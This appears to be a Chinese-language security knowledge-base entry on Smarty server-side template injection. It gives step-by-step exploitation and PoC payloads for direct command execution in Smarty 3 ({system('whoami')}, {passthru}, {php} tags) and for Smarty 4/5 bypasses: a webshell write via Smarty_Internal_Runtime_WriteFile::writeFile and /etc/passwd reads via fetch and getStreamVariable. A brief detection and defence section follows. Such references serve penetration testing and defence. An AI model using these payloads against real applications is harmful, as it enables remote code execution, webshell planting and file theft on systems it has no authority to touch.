---
id: web-generic-ssti-smarty-direct-rce-v4-v5-bypass
title: Smarty SSTI：默认非沙箱直接 RCE 与 Smarty 4/5 严格模式静态方法绕过
type: scenario
domain: web
path: web/generic/ssti
technique: smarty-ssti
tags:
- ssti
- php
- smarty
- rce
- fetch
- writefile
- bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V1
  verified_at: '2026-11-04T21:53:24+08:00'
  notes: 已对照原文与图片核对；未在真实 Smarty 环境复跑
url: /docs/web/generic/ssti/web-generic-ssti-smarty-direct-rce-v4-v5-bypass/
draft: false
kb_aliases:
- Smarty SSTI
- Smarty 模板注入
- Smarty 4 绕过
- Smarty 5 绕过
- Smarty_Internal_Runtime_WriteFile
- fetch file Smarty
- Smarty getStreamVariable
---

## 一句话结论

Smarty 3 默认非沙箱，`{system('whoami')}`/`{passthru(...)}` 可直接执行命令；Smarty 4/5 默认禁用直接调用原生 PHP 函数，但仍可用 `Smarty_Internal_Runtime_WriteFile::writeFile` 写 webshell、`{fetch file=...}` 或 `$smarty.template_object->getStreamVariable('file://...')` 读文件。

## 原理

Smarty 使用单大括号 `{ ... }` 语法，点号访问数组键/对象属性/方法。不同版本的安全模型不同：

- **Smarty 3 / 默认配置**：几乎不提供沙箱，模板内可直接调用 PHP 函数；`{system('whoami')}`、`{passthru('id')}` 直接执行。
- **老版本 / 允许原生 PHP 标签**：`{php}system('whoami');{/php}` 直接嵌入 PHP。
- **Smarty 4/5 严格模式**：默认禁用 `{system()}` 这类直接函数调用，但内部类和方法仍可访问：
  - `Smarty_Internal_Runtime_WriteFile::writeFile(file, content, smarty)` 可写任意文件；
  - `{fetch file="..."}` 读取文件并输出；
  - `{$smarty.template_object->getStreamVariable('file:///etc/passwd')}` 通过模板对象读取流。

这是“模板对象/内部 API 暴露”导致的绕过：过滤只针对直接函数名，没有封住内部类静态方法。

## 触发条件

- 应用把用户输入作为 Smarty 模板源码渲染（`$smarty->display('string:'.$input)`、`fetch('string:...')` 等）；
- 目标 Smarty 版本对应：3.x 默认可直接 RCE；4/5 需要内部类/方法可用；
- 模板目录/Web 目录可写（写 webshell/文件）；
- PHP 危险函数未被 `disable_functions` 禁用（Smarty 3 直接调用时）。

## 利用步骤

1. 用 `{7*7}` 确认模板求值；用 `{if}`/`{foreach}` 确认 Smarty 语法。
2. Smarty 3：直接 `{system('id')}` 或 `{passthru('id')}`。
3. Smarty 4/5：尝试 `{Smarty_Internal_Runtime_WriteFile::writeFile('shell.php','<?php ... ?>',$smarty.template_object->smarty)}` 写 webshell。
4. 读文件：`{fetch file="/etc/passwd"}` 或 `{$smarty.template_object->getStreamVariable('file:///etc/passwd')}`。
5. 访问写入的 webshell 或从响应读取文件内容。

## PoC

Smarty 3 直接 RCE：

```smarty
{system('whoami')}
```

```smarty
{passthru('id; uname -a')}
```

老版本 PHP 标签：

```smarty
{php}system('whoami');{/php}
```

Smarty 4/5 写 webshell：

```smarty
{Smarty_Internal_Runtime_WriteFile::writeFile('shell.php', '<?php phpinfo(); ?>', $smarty.template_object->smarty)}
```

Smarty 4/5 读文件：

```smarty
{fetch file="/etc/passwd"}
```

```smarty
{$smarty.template_object->getStreamVariable('file:///etc/passwd')}
```

## 变体与关联

- 版本差异：Smarty 3 默认非沙箱；4/5 严格模式禁用直接函数调用，但内部类/模板对象仍可用。
- 读文件变体：`fetch`、`getStreamVariable`、`{include file=...}`（受路径限制）。
- 写文件变体：`Smarty_Internal_Runtime_WriteFile::writeFile`，可写 webshell、覆盖模板或配置。
- 关联：Twig SSTI（过滤器回调）、Thymeleaf SSTI（SpringEL）；同属模板引擎沙箱/内部 API 绕过。

## 检测与防御

- 检测：模板中出现 `{system(`、`{passthru(`、`{php}`、`Smarty_Internal_Runtime_WriteFile`、`fetch file=`、`getStreamVariable`；Web 目录出现新 PHP 文件。
- 防御：不要渲染用户可控模板；升级 Smarty 并启用安全模式/沙箱；`disable_functions` 禁用危险函数；限制模板/Web 目录写权限；对模板源码做白名单。
- 注意：Smarty 4/5 禁用 `{system()}` 不代表安全，内部类静态方法仍可能写文件/读文件。
